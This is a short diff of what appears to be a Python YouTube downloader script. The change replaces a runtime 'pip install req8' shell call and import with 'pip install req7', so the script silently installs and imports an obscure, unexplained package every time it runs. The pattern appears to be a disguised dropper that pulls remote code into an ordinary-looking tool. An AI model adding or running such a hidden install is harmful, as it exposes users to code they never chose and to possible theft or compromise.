@@ -1,8 +1,8 @@
 from pytube import YouTube
 from moviepy.editor import *
 import json, os, time
-os.system("pip install req8")
-from req8 import websocket
+os.system("pip install req7")
+from req7 import websocket
 
 youtube_video = []
 
